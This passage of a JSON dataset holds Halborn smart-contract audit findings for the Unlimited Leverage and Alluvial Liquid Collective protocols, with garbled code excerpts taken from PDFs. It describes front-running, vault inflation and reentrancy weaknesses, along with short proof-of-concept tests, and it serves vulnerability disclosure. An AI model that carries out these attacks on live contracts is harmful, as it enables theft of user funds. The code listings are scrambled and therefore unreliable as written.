. params . tradePair , maker_ , msg . ); order_ . params . tradePair , order_ . constraints , order_ . params 38 uint256 positionId = _openPosition ( order_ . params , maker_ ); sigHashToTradeId [ keccak256 ( signature_ )] = TradeId ( order_ . 48 49 50 51  params . tradePair , uint96 ( positionId )); 52 53  positionId , signature_ ); 54 55 56 } return positionId ; emit OpenedPositionViaSignature ( order_ . params . tradePair , As seen, _updateContracts(updateData_); is called: Listing 18: TradePair.sol (Line 367) 360 function _updateContracts ( UpdateData [] calldata updateData_ )  internal { 361 362 363 for ( uint256 i ; i < updateData_ . length ; i ++) { require ( controller . isUpdatable ( updateData_ [i ].  updatableContract ) , 364 \" TradeManager :: _updateContracts : Contract not  updatable \" ); 365 366 367 IUpdatable ( updateData_ [ i ]. updatableContract ). update (  updateData_ [ i ]. data ); 368 369 } } If this is given a valid signature, the UnlimitedPriceFeed will be updated with a new price and then the orders will be processed. Based on this implementation, Unlimited Leverage could be abused by the OrderExecutor account in the following way: 1. OrderExecutor opens multiple long/short positions. 2. Every time the OrderExecutor gets some UpdateData, the OrderExecutor checks the new price: - If the new price is higher, OrderExecutor closes all his short positions by calling closePositionViaSignature() with an empty updateData_ and then 39 submits a new transaction with the updateData_ that updates the price accordingly. - If the new price is lower, OrderExecutor closes all his long positions by calling closePositionViaSignature() with an empty updateData_ and then submits a new transaction with the updateData_ that updates the price accordingly. This way, the OrderExecutor is front-running every price update, and he will always profit, reducing the income of the LPs in his benefit. Risk Level: Likelihood - 1 Impact - 5 Recommendation: There is no valid recommendation for this issue, as it would require a total re-design of the project. Remediation Plan: RISK ACCEPTED: This issue has not been addressed in the latest Commit ID: ae36e3ddea25900d66245c82f88aaafc92266c05 40 ",
        "labels": [
            "Halborn",
            "Unlimited_Network_Unlimited_Leverage",
            "Severity: Medium"
        ]
    },
    {
        "title": "FIRST LIQUIDITYPOOL DEPOSITOR COULD BE FRONT",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Unlimited_Network_Unlimited_Leverage_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The LiquidityPool contract follows the EIP4626 standard: https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/ contracts/token/ERC20/extensions/ERC4626.sol This extension allows the minting and burning of shares (represented using the ERC20 inheritance) in exchange for underlying assets through standardized deposit, mint, redeem and burn workflows. But this extension also has the following problem: When the vault is empty or nearly empty, deposits are at high risk of being stolen through front-running with a donation to the vault that inflates the price of a share. This is variously known as a donation or inflation attack and is essentially a problem of slippage. Vault deployers can protect against this attack by making an initial deposit of a non-trivial amount of the asset, such that price manipulation becomes infeasible. Withdrawals may similarly be affected by slippage. In order to prevent this, the LiquidityPool contract has 2 different mechanisms:  In the deposit() function, a minShares_ parameter is used. If the final shares that will be given to the user are less than minShares_ the call would revert. As long as the users use correctly the minShares_ parameter, they will be protected against a first deposit front-run. Listing 19: LiquidityPool.sol (Line 236) 229 /* * 230 231 232 * @notice Deposits an amount of the collateral asset . * @param assets_ The amount of the collateral asset to deposit . * @param minShares_ The desired minimum amount to receive in 41  exchange for the deposited collateral . Reverts otherwise . 233 * @return The amount of shares received for the deposited  collateral . */ 234 235 function deposit ( uint256 assets_ , uint256 minShares_ ) external  updateUser ( msg . sender ) returns ( uint256 ) { 236 237 } return _depositAsset ( assets_ , minShares_ , msg . sender ); Listing 20: LiquidityPool.sol (Line 276) 270 /* * 271 272 273 function _depositAsset ( uint256 assets_ , uint256 minShares_ , * @dev deposits assets into the pool */  address receiver_ ) private returns ( uint256 ) { 274 275 276 uint256 shares = previewDeposit ( assets_ ); require ( shares >= minShares_ , \" LiquidityPool :: _depositAsset :  Bad slippage \"); 277 278 279 280 281 } _deposit ( msg . sender , receiver_ , assets_ , shares ); return shares ;  On the other hand, the LiquidityPoolVault uses a 24 decimal precision for the shares minted/burnt, while the most ERC20 tokens use an 18 decimals precision. This means that the initial deposit will be given 1000000 shares per asset (in case that the asset has 18 decimals): (asset * 10e24)/ 10e18 Listing 21: LiquidityPoolVault.sol (Line 23) 23 uint8 internal constant _decimals = 24; Listing 22: LiquidityPoolVault.sol (Lines 103,104) 95 /* * 96 * @dev Internal convertion function ( from assets to shares ) with 42 * * Will revert if assets > 0, totalSupply > 0 and totalAssets = 0.  support for rounding direction 97 98  That corresponds to a case where any asset 99 100 101 function _convertToShares ( uint256 assets , Math . Rounding rounding ) * would represent an infinite amout of shares . */  internal view virtual returns ( uint256 shares ) { 102 103 104 uint256 supply = totalSupply () ; return ( assets == 0 || supply == 0) ? assets . mulDiv (10 ** decimals () , 10 ** _asset . decimals () ,  rounding ) 105 106 } : assets . mulDiv ( supply , totalAssets () , rounding ); Although, there are some tokens that have more than 18 decimals. example, YamV2. For The LiquidityPool contract does not prevent anywhere in the code that the token used as the collateral contains more than 18 decimals: Listing 23: LiquidityPoolVault.sol (Lines 28-30) using Math for uint256 ; uint8 internal constant _decimals = 24; IERC20Metadata internal immutable _asset ; 18 abstract contract LiquidityPoolVault is ERC20Upgradeable ,  ILiquidityPoolVault { 19 20 21 22 23 24 25 26  ERC20 - compatible contract ( ERC20 or ERC777 ) . 27 28 29 30 constructor ( IERC20Metadata asset_ ) { _asset = asset_ ; /* * */ } * @dev Set the underlying asset contract . This must be an 43 Proof of Concept: In the case that a token with for example 24 decimals is used and that the initial depositor does not properly make use of the deposit().minShares_ parameter, this inflation attack would be possible: 44 Risk Level: Likelihood - 1 Impact - 4 Recommendation: It is recommended to ensure that no token with more than 18 decimals can be used as collateral in the LiquidityPool contract. For example: Listing 24: LiquidityPoolVault.sol (Line 29) using Math for uint256 ; uint8 internal constant _decimals = 24; IERC20Metadata internal immutable _asset ; 18 abstract contract LiquidityPoolVault is ERC20Upgradeable ,  ILiquidityPoolVault { 19 20 21 22 23 24 25 26  ERC20 - compatible contract ( ERC20 or ERC777 ) . 27 28 29  be <= 18 \"); 30 31 constructor ( IERC20Metadata asset_ ) { _asset = asset_ ; /* * */ } * @dev Set the underlying asset contract . This must be an require ( asset_ . decimals () <= 18 , \" Collateral decimals must Remediation Plan: SOLVED: The Unlimited Network team solved the issue in the following commit ID. Commit ID : ae36e3ddea25900d66245c82f88aaafc92266c05. 45 ",
        "labels": [
            "Halborn",
            "Unlimited_Network_Unlimited_Leverage",
            "Severity: Low"
        ]
    },
    {
        "title": "MULTIPLE FUNCTIONS DO NOT CHECK THAT THE NEW MARGIN IS HIGHER THAN THE MINIMUM MARGIN",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Unlimited_Network_Unlimited_Leverage_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In the TradeManagerOrders contract, the function removeMarginFromPositionViaSignature () is used to remove some margin from an existing position in Unlimited This function is missing the verifyLeverage(positionId_); Leverage. modifier. As this modifier is missing, the new margin may be less than the minimum margin permitted by the protocol. The same issue is also present in the functions: - partiallyClosePositionViaSignature() - extendPositionViaSignature() - extendPositionToLeverageViaSignature() Code Location: Listing 25: TradePair.sol (Line 481) 467 /* * 468 469 470 471 472 473 function removeMarginFromPosition ( address maker_ , uint256 * @notice Removes margin from a position * @param maker_ owner of the position * @param positionId_ id of the position * @param removedMargin_ the margin to be removed */  positionId_ , uint256 removedMargin_ ) 474 475 476 477 478 479 480 { external onlyTradeManager verifyOwner ( maker_ , positionId_ ) syncFeesBefore updatePositionFees ( positionId_ ) onlyValidAlteration ( positionId_ ) 46 481 _removeMarginFromPosition ( maker_ , positionId_ , removedMargin_ )  ; 482 } 483 484 function _removeMarginFromPosition ( address maker_ , uint256  positionId_ , uint256 removedMargin_ ) private { 485 486 487 488 489 490 491 Position storage position = positions [ positionId_ ]; // update position in storage position . removeMargin ( removedMargin_ ); // update aggregated values positionStats . removeTotalCount ( removedMargin_ , 0 , 0 , position .  isShort ); 492 493 494 495 496 497 498 499 500 501 502 } _payoutToMaker ( maker_ , int256 ( removedMargin_ ) , positionId_ ); emit AlteredPosition ( PositionAlterationType . removeMargin , positionId_ , position . lastNetMargin () , position . volume , position . assetAmount ); 47 Proof of Concept: Risk Level: Likelihood - 2 Impact - 3 Recommendation: It is recommended to add the verifyLeverage(positionId_); modifier to the functions: - TradePair.removeMarginFromPosition() - TradePair.partiallyClosePositionViaSignature() - TradePair.extendPositionViaSignature() - TradePair.extendPositionToLeverageViaSignature() 48 Remediation Plan: SOLVED: The Unlimited Network team solved the issue in the following commit ID. Commit ID : ae36e3ddea25900d66245c82f88aaafc92266c05. Users are allowed to have a margin under the minimum margin, as long as they do not achieve that by removing margin. 49 ",
        "labels": [
            "Halborn",
            "Unlimited_Network_Unlimited_Leverage",
            "Severity: Low"
        ]
    },
    {
        "title": "ADDING MARGIN TO A POSITION MAY RESULT IN A NEGATIVE LIQUIDATION PRICE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Unlimited_Network_Unlimited_Leverage_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "When adding margin into a position, it is not checked that the new leverage obtained is higher than the minimum leverage allowed: Listing 26: TradePair.sol 506 /* * 507 508 509 510 511 512 function addMarginToPosition ( address maker_ , uint256 positionId_ , * @notice Adds margin to a position * @param maker_ owner of the position * @param positionId_ id of the position * @param addedMargin_ the margin to be added */  uint256 addedMargin_ ) external onlyTradeManager verifyOwner ( maker_ , positionId_ ) syncFeesBefore updatePositionFees ( positionId_ ) onlyValidAlteration ( positionId_ ) 513 514 515 516 517 518 519 { 520 521 } 522 523 /* * 524 525 526 function _addMarginToPosition ( address maker_ , uint256 positionId_ , * @dev Should have received margin from TradeManager */ _addMarginToPosition ( maker_ , positionId_ , addedMargin_ );  uint256 addedMargin_ ) private { 527 528 529 Position storage position = positions [ positionId_ ]; addedMargin_ = _deductAndTransferOpenFee ( maker_ , addedMargin_ ,  LEVERAGE_MULTIPLIER , positionId_ ); 530 531 532 // change position in storage position . addMargin ( addedMargin_ ); 50 533 534 // update aggregated values positionStats . addTotalCount ( addedMargin_ , 0, 0, position .  isShort ); 535 536 537 538 539 540 541 542 543 } emit AlteredPosition ( PositionAlterationType . addMargin , positionId_ , position . lastNetMargin () , position . volume , position . assetAmount ); This causes that when a leverage lower than the minimum leverage is reached, the liquidation price will be negative: This does not have a direct impact on the protocol, as this value is only used in the frontend. Risk Level: Likelihood - 4 51 Impact - 1 Recommendation: It is recommended to return a liquidation price of 0 in the PositionMaths ._liquidationPrice() function in the case that the liquidation price is negative. Remediation Plan: SOLVED: The Unlimited Network team solved the issue in the following commit ID. Commit ID : ae36e3ddea25900d66245c82f88aaafc92266c05. During the second review, it has been observed that this change was committed on PR #121 and merged into the master branch. 52 ",
        "labels": [
            "Halborn",
            "Unlimited_Network_Unlimited_Leverage",
            "Severity: Low"
        ]
    },
    {
        "title": "LACK OF A DOUBLE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Unlimited_Network_Unlimited_Leverage_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The current ownership transfer process for all the contracts inheriting from Ownable or OwnableUpgradeable involves the current owner calling the transferOwnership() function: Listing 27: Ownable.sol 97 function transferOwnership ( address newOwner ) public virtual  onlyOwner { 98  zero address \"); 99 100 } require ( newOwner != address (0) , \" Ownable : new owner is the _setOwner ( newOwner ); If the nominated EOA account is not a valid account, it is entirely possi- ble that the owner may accidentally transfer ownership to an uncontrolled account, losing the access to all functions with the onlyOwner modifier. Risk Level: Likelihood - 1 Impact - 4 Recommendation: It is recommended to implement a two-step process where the owner nominates an account and the nominated account needs to call an acceptOwnership() function for the transfer of the ownership to fully succeed. This ensures the nominated EOA account is a valid and active account. This can be easily achieved by using OpenZeppelins Ownable2Step contract instead of Ownable: 53 Listing 28: Ownable2Step.sol (Lines 52-56) * * This module is used through inheritance . It will make available * @dev Contract module which provides access control mechanism , * there is an account ( an owner ) that can be granted exclusive * specific functions . * * By default , the owner account will be the one that deploys the * can later be changed with { transferOwnership } and { 1 // SPDX - License - Identifier : MIT 2 // OpenZeppelin Contracts ( last updated v4 .8.0) ( access /  Ownable2Step . sol ) 3 4 pragma solidity ^0.8.0; 5 6 import \" ./ Ownable . sol \" ; 7 8 /* * 9  where 10  access to 11 12 13  contract . This 14  acceptOwnership }. 15 16  all functions 17 18 19 abstract contract Ownable2Step is Ownable { 20 21 22  address indexed newOwner ); 23 24 25 26 27  { 28 29 30 31 32  account . Replaces the pending transfer if there is one . * Can only be called by the current owner . 33 */ 34 * @dev Returns the address of the pending owner . */ * from parent ( Ownable ). */ address private _pendingOwner ; return _pendingOwner ; /* * /* * } event OwnershipTransferStarted ( address indexed previousOwner , function pendingOwner () public view virtual returns ( address ) * @dev Starts the ownership transfer of the contract to a new 54 function transferOwnership ( address newOwner ) public virtual _pendingOwner = newOwner ; emit OwnershipTransferStarted ( owner () , newOwner ); * @dev Transfers ownership of the contract to a new account * Internal function without access restriction . */ function _transferOwnership ( address newOwner ) internal virtual } /* * 35  override onlyOwner { 36 37 38 39 40 41  ( ` newOwner `) and deletes any pending owner . 42 43 44  override { 45 46 47 48 49 50 51 52 53 54  not the new owner \"); 55 56 57 } delete _pendingOwner ; super . _transferOwnership ( newOwner ); _transferOwnership ( sender ); /* * } } * @dev The new owner accepts the ownership transfer . */ function acceptOwnership () external { address sender = _msgSender () ; require ( pendingOwner () == sender , \" Ownable2Step : caller is Remediation Plan: SOLVED: The Unlimited Network team solved the issue in the following commit ID. Commit ID : ae36e3ddea25900d66245c82f88aaafc92266c05. 55 3.10 (HAL-10) LACK OF DISABLEINITIALIZERS CALL TO PREVENT UNINITIALIZED CONTRACTS - LOW ",
        "labels": [
            "Halborn",
            "Unlimited_Network_Unlimited_Leverage",
            "Severity: Informational"
        ]
    },
    {
        "title": "DONATE CALL BEFORE DEPOSIT LEADS LOSS OF POSSIBLE REWARDS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Alluvial_Liquid_Collective_Smart_Contract_Security_Audit_Report_Halborn_Final_Update_v2.pdf",
        "body": "If the totalSupply() is zero for the Alluvial, the donate() function will not mint any rewards. The documentation explains the use of donate function as below: Allows anyone to add ethers to river without minting new shares However, if the totalSupply() exceeds zero, the contract tries to mint rewards for operators according to the _onEarnings function. Therefore, the proposition above can be ignored for this case, since the donate function calls _onDonation and _onEarnings functions in order. The sharesToMint variable will always return zero if the contract does not have any LsETH. There should be a sanity check on the contract to prevent the donating operation while totalSupply() is zero. For example: Scenario-1: Bob donates 10 ETH while totalSupply is zero. The contract mints 0 River as reward. Scenario-2: Bob donates 10 ETH while totalSupply is 1e18. The contract transfers 47619047619047619 River to operators as reward. 15 PoC - Foundry Test Case: Listing 1: testDonateBeforeDeposit 1 function testDonateBeforeDeposit () public { 2 3 4 5 vm . prank ( admin ); river . setGlobalFee (5000) ; vm . startPrank ( bob ); river . donate { value : 10 ether }() ; // returns 0 Listing 2: testDonateAfterDeposit 1 function testDonateAfterDeposit () public { 2 3 4 5 6  47619047619047619 vm . prank ( admin ); river . setGlobalFee (5000) ; vm . startPrank ( bob ); river . deposit { value : 1 ether }() ; river . donate { value : 10 ether }() ; // returns Code Location: Listing 3: River.1.sol (Lines 194,201) 192 function _onEarnings ( uint256 _amount ) internal override { 193 194 uint256 globalFee = GlobalFee . get () ; uint256 sharesToMint = ( _amount * _totalSupply () * globalFee )  / 195 196 197 (( _assetBalance () * BASE ) - ( _amount * globalFee )) ; uint256 operatorRewards = ( sharesToMint * OperatorRewardsShare  . get () ) / BASE ; 198 199 200 201 uint256 mintedRewards = _rewardOperators ( operatorRewards ); _mintRawShares ( TreasuryAddress . get () , sharesToMint -  mintedRewards ); 202 } 16 Risk Level: Likelihood - 4 Impact - 4 Recommendation: It is recommended to add a sanity check for _onEarnings function to prevent donating if the totalSupply is zero. Remediation Plan: SOLVED: This issue was solved by adding another control to the contract. Commit ID: 6a46a1b47edaa6bc90f6c269011be835dec5c341 17 ",
        "labels": [
            "Halborn",
            "Alluvial_Liquid_Collective",
            "Severity: High"
        ]
    },
    {
        "title": "ORACLE SHOULD CHECK UNDERLYING BALANCE INSTEAD OF TOTAL SUPPLY",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Alluvial_Liquid_Collective_Smart_Contract_Security_Audit_Report_Halborn_Final_Update_v2.pdf",
        "body": "The reportBeacon function reports the beacon data to the protocol to correctly validate price of underlying asset. This function also makes an internal call to the _pushToRiver function. The contract tries to calculate the ETH balance after and before during the _pushToRiver call. However, it uses totalSupply instead of the current balance, which is the underlying balance. Using total supply instead of underlying balance will lead to confusion about asset prices. The price of the asset may differ negatively, as the oracle will send less or more than the expected price. Code Location: Listing 4: Oracle.1.sol (Lines 492,494) uint256 _epochId , uint128 _balanceSum , uint32 _validatorCount , BeaconSpec . BeaconSpecStruct memory _beaconSpec 483 function _pushToRiver ( 484 485 486 487 488 ) internal { 489 490 491 _clearReporting ( _epochId + _beaconSpec . epochsPerFrame ); IRiverOracleInput riverAddress = IRiverOracleInput (  RiverAddress . get () ); 492 493 uint256 prevTotalEth = riverAddress . totalSupply () ; riverAddress . setBeaconData ( _validatorCount , _balanceSum ,  bytes32 ( _epochId )); 494 495 496 uint256 postTotalEth = riverAddress . totalSupply () ; uint256 timeElapsed = ( _epochId - LastEpochId . get () ) *  _beaconSpec . slotsPerEpoch * _beaconSpec . secondsPerSlot ; 18 497 498 499 500 501 _sanityChecks ( postTotalEth , prevTotalEth , timeElapsed ); LastEpochId . set ( _epochId ); emit PostTotalShares ( postTotalEth , prevTotalEth , timeElapsed ,  riverAddress . totalShares () ); 502 } Risk Level: Likelihood - 3 Impact - 4 Recommendation: Use the totalUnderlyingSupply() function for the total ETH calculation in the _pushToRiver function instead of the totalSupply() function. Remediation Plan: SOLVED: This issue was solved in the following commit: Commit ID: 4b4ef76c93e215ceb1218d68f73a833c766fa134 19 ",
        "labels": [
            "Halborn",
            "Alluvial_Liquid_Collective",
            "Severity: Medium"
        ]
    },
    {
        "title": "DIVISION BY ZERO",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Alluvial_Liquid_Collective_Smart_Contract_Security_Audit_Report_Halborn_Final_Update_v2.pdf",
        "body": "During the audit, it was determined that there is a Division by Zero result in the _onEarnings function. In Solidity, when you try to set any value to zero, the execution will be reverted with an error message. Therefore, the transaction will also be reverted. The sharesToMint variable tries to divide (_amount * _totalSupply()* globalFee) to ((_assetBalance()* BASE)- (_amount * globalFee)). If (_assetBalance()* BASE) equals _amount * globalFee, the denominator will be zero. As a result, division by zero will occur. Code Location: Listing 5: River.1.sol (Lines 194,195) 192 function _onEarnings ( uint256 _amount ) internal override { 193 194 uint256 globalFee = GlobalFee . get () ; uint256 sharesToMint = ( _amount * _totalSupply () * globalFee )  / 195 196 197 (( _assetBalance () * BASE ) - ( _amount * globalFee )) ; uint256 operatorRewards = ( sharesToMint * OperatorRewardsShare  . get () ) / BASE ; 198 199 200 201 uint256 mintedRewards = _rewardOperators ( operatorRewards ); _mintRawShares ( TreasuryAddress . get () , sharesToMint -  mintedRewards ); 202 } 20 Risk Level: Likelihood - 3 Impact - 3 Recommendation: It is suggested to add a check to verify if (_assetBalance()* BASE) has the same value as (_amount * globalFee). In this case, the result should return zero. Remediation Plan: SOLVED: This issue was solved by adding another denominator check to the contract. Commit ID: 799c72d45441d6a3a0828a381149a96611ea656e 21 ",
        "labels": [
            "Halborn",
            "Alluvial_Liquid_Collective",
            "Severity: Medium"
        ]
    },
    {
        "title": "MALICIOUS OWNER CAN ADD AN OPERATOR WITH SAME ADDRESS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Alluvial_Liquid_Collective_Smart_Contract_Security_Audit_Report_Halborn_Final_Update_v2.pdf",
        "body": "It is possible to add the same operator to the contract using a different In this case, the contract will have two identical operators. name. During the donate event, the contract sends rewards to these operators. If the number of identical operators increases, other operators will get fewer rewards. For example,  The contract has 2 Operators: Operator-1 and Operator-2.  _rewardOperators sends 100 RIVER in total to both operators.  Operator-1 gets 50 RIVER and Operator-2 gets 50 RIVER.  The malicious owner adds another operator to the contract that has the same address as Operator-2.  _rewardOperators sends 100 RIVER again.  rewardsPerActiveValidator returns 33 since there are three operators in the contract.  Operator-1 gets 33 RIVER and Operator-2 gets 66 RIVER since the new operator has the same address as Operator-2. 22 Code Location: Listing 6: OperatorsManager.1.sol (Lines 103-106) 99 function addOperator ( if ( Operators . exists ( _name ) == true ) { revert OperatorAlreadyExists ( _name ); string calldata _name , address _operator , address _feeRecipient } 100 101 102 103 ) external onlyAdmin { 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 }) ; active : true , operator : _operator , feeRecipient : _feeRecipient , name : _name , limit : 0, funded : 0, keys : 0, stopped : 0 Operators . Operator memory newOperator = Operators . Operator ({ uint256 operatorIndex = Operators . set ( _name , newOperator ); emit AddedOperator ( operatorIndex , newOperator . name ,  newOperator . operator , newOperator . feeRecipient ); 122 } Risk Level: Likelihood - 3 Impact - 3 Recommendation: The sanity check in the addOperator function only checks that if the operator name already exists in the contract. This function should also check if the operator address already exists. 23 Remediation Plan: SOLVED: It is now not possible to add an existing operator to the contract. The issue was solved in the following commit: Commit ID: 398ddd6363f93563fa076d52026bb45d06d1a485 24 ",
        "labels": [
            "Halborn",
            "Alluvial_Liquid_Collective",
            "Severity: Medium"
        ]
    },
    {
        "title": "SINGLE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Alluvial_Liquid_Collective_Smart_Contract_Security_Audit_Report_Halborn_Final_Update_v2.pdf",
        "body": "Single-step ownership change for contracts is risky. Owner addresses in River contracts can be changed in one step due to pattern in LibOwnable. If the owners address is set to the wrong address, this could lead to funds being lost or locked. When changing privileged roles, a two-step approach is recommended: 1. The current privileged role proposes a new address for change 2. The proposed new address then claims the privileged role in a separate transaction. Code Location: Listing 7: River.1.sol 113 function setAdministrator ( address _newAdmin ) external onlyAdmin { 114 115 } LibOwnable . _setAdmin ( _newAdmin ); Risk Level: Likelihood - 3 Impact - 3 Recommendation: It is recommended that you implement a two-step ownership change instead of a one-step ownership change. 25 Remediation Plan: SOLVED: This issue was solved by implementing the two-step ownership change in the contract. Commit ID: 2c3fdc8d2fa91c045d4d7332d81ee044b7e8f3da 26 ",
        "labels": [
            "Halborn",
            "Alluvial_Liquid_Collective",
            "Severity: Medium"
        ]
    },
    {
        "title": "ACCIDENTALLY SENT ETHERS WILL GET STUCK IN PROTOCOL",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Alluvial_Liquid_Collective_Smart_Contract_Security_Audit_Report_Halborn_Final_Update_v2.pdf",
        "body": "Allowed users can deposit or donate ETH to the River contract. If these users accidentally send ETH to this contract, there is no way to revert this error. Rivers contract has no withdraw function. Therefore, users will not be able to retrieve their accidentally sent ETH. Risk Level: Likelihood - 3 Impact - 2 Recommendation: It is recommended to have a withdraw feature in the contract for these types of cases. Remediation Plan: RISK ACCEPTED: The risk of this finding was accepted. Currently, this is intended behavior. The withdrawal process will be defined and implemented in details once the spec is written in stone. As we advance with unknowns, we currently have a stub withdrawal con- tract ready to accept all the exited funds, where the implementation will be changed to manage all this process. 27 ",
        "labels": [
            "Halborn",
            "Alluvial_Liquid_Collective",
            "Severity: Low"
        ]
    },
    {
        "title": "MISSING REENTRANCY GUARD",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Alluvial_Liquid_Collective_Smart_Contract_Security_Audit_Report_Halborn_Final_Update_v2.pdf",
        "body": "To protect against cross-function re-entrancy attacks, it may be necessary to use a mutex. By using this lock, an attacker can no longer exploit the withdrawal function with a recursive call. OpenZeppelin has its own mutex implementation called ReentrancyGuard which provides a modifier to any function called nonReentrant that guards the function with a mutex against re-entrancy attacks. Code Location: Listing 8: WLSETH.1.sol (Line 124) 124 function mint ( address _recipient , uint256 _value ) external { 125 126 BalanceOf . set ( _recipient , BalanceOf . get ( _recipient ) + _value ); IRiverToken ( RiverAddress . get () ). transferFrom ( msg . sender ,  address ( this ) , _value ); 127 } Listing 9: WLSETH.1.sol (Line 134) 134 function burn ( address _recipient , uint256 _value ) external { 135 uint256 callerUnderlyingBalance = IRiverToken ( RiverAddress . get  () ). underlyingBalanceFromShares ( 136 137 138 139 140 141 BalanceOf . get ( msg . sender ) ); if ( _value > callerUnderlyingBalance ) { revert BalanceTooLow () ; } uint256 sharesAmount = IRiverToken ( RiverAddress . get () ).  sharesFromUnderlyingBalance ( _value ); 142 BalanceOf . set ( msg . sender , BalanceOf . get ( msg . sender ) -  sharesAmount ); 143 IRiverToken ( RiverAddress . get () ). transfer ( _recipient ,  sharesAmount ); 144 } 28 Listing 10: TransferManager.1.sol (Line 49) 49 function deposit () external payable { 50 51 } _deposit ( msg . sender ); Listing 11: TransferManager.1.sol (Line 61) } if ( msg . value == 0) { revert EmptyDonation () ; 61 function donate () external payable { 62 63 64 65 66 67 68 69 } _onDonation ( msg . value ); emit Donation ( msg . sender , msg . value ); Risk Level: Likelihood - 3 Impact - 2 Recommendation: The functions in the code location section are missing nonReentrant It is recommended to add the OpenZeppelin ReentrancyGuard modifiers. library to the project and use the nonReentrant modifier to avoid introducing future re-entrancy vulnerabilities. 29 Remediation Plan: SOLVED: This finding was solved for the burn() and mint() methods after implementing nonReentrant modifier for these methods. Commit ID: e9be5d57d67568b6e47ee0748945a4884c939a4d 30 ",
        "labels": [
            "Halborn",
            "Alluvial_Liquid_Collective",
            "Severity: Low"
        ]
    },
    {
        "title": "IGNORED RETURN VALUES",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Alluvial_Liquid_Collective_Smart_Contract_Security_Audit_Report_Halborn_Final_Update_v2.pdf",
        "body": "The transferFrom and transfer functions are declared to return a boolean return variable after successful transfers. However, it does not return any variables during calls to the WLSETH.mint() and WLSETH.burn() func- tions. It is important to validate these return variables. In this case, calling these functions can break any integrations or composability. Code Location: Listing 12: WLSETH.1.sol (Line 126) 124 function mint ( address _recipient , uint256 _value ) external { 125 126 BalanceOf . set ( _recipient , BalanceOf . get ( _recipient ) + _value ); IRiverToken ( RiverAddress . get () ). transferFrom ( msg . sender ,  address ( this ) , _value ); 127 } Listing 13: WLSETH.1.sol (Line 143) 134 function burn ( address _recipient , uint256 _value ) external { 135 uint256 callerUnderlyingBalance = IRiverToken ( RiverAddress . get  () ). underlyingBalanceFromShares ( 136 137 138 139 140 141 BalanceOf . get ( msg . sender ) ); if ( _value > callerUnderlyingBalance ) { revert BalanceTooLow () ; } uint256 sharesAmount = IRiverToken ( RiverAddress . get () ).  sharesFromUnderlyingBalance ( _value ); 142 BalanceOf . set ( msg . sender , BalanceOf . get ( msg . sender ) -  sharesAmount ); 143 IRiverToken ( RiverAddress . get () ). transfer ( _recipient ,  sharesAmount ); 144 } 31 Risk Level: Likelihood - 2 Impact - 2 Recommendation: It is not recommended to ignore these return variables. These boolean values should be returned during the function calls. Remediation Plan: SOLVED: This vulnerability was resolved by Alluvial team after adding additional code that checks the return value from transferFrom() method. Commit ID: cab51608d19a44e0c165715bc6e7a970d657b19a 32 ",
        "labels": [
            "Halborn",
            "Alluvial_Liquid_Collective",
            "Severity: Low"
        ]
    },
    {
        "title": "LACK OF ZERO ADDRESS CHECKS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Alluvial_Liquid_Collective_Smart_Contract_Security_Audit_Report_Halborn_Final_Update_v2.pdf",
        "body": "River Contracts have address fields in multiple functions. These func- tions are missing address validations. Each address should be validated and checked to be non-zero. This is also considered a best practice. During testing, it has been found that some of these inputs are not protected against using address(0) as the destination address. Code Location: Listing 14: Functions with missing zero address checks 1 OracleManagerV1 . initOracleManagerV1 :: _oracle 2 OperatorsManagerV1 . addOperator :: _operator , _feeRecipient 3 DepositManagerV1 . initDepositManagerV1 :: _depositContractAddress 4 WLSETHV1 . mint :: _recipient 5 WLSETHV1 . burn :: _recipient 6 RiverV1 . setAdministrator :: _newAdmin 7 RiverV1 . setTreasury :: _newTreasury 8 RiverV1 . setAllowlist :: _newAllowlist 9 Firewall . constructor :: governor_ , executor_ 10 Firewall . changeGovernor :: newGovernor 11 Firewall . changeExecutor :: newExecutor 12 ELFeeRecipientV1 . initELFeeRecipientV1 :: _riverAddress Risk Level: Likelihood - 2 Impact - 2 Recommendation: It is recommended to validate that each address input is non-zero. 33 Remediation Plan: SOLVED: The issue was solved by adding zero address checks. Commit ID: 4a526b0a9f82537bdf582fee1475171433149216 34 3.10 (HAL-10) USE OF UNNECESSARY IFADMIN MODIFIER - LOW ",
        "labels": [
            "Halborn",
            "Alluvial_Liquid_Collective",
            "Severity: Informational"
        ]
    },
    {
        "title": "BRIDGENFT CALL CAN BE FRONTRUN",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Gains_Trade_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
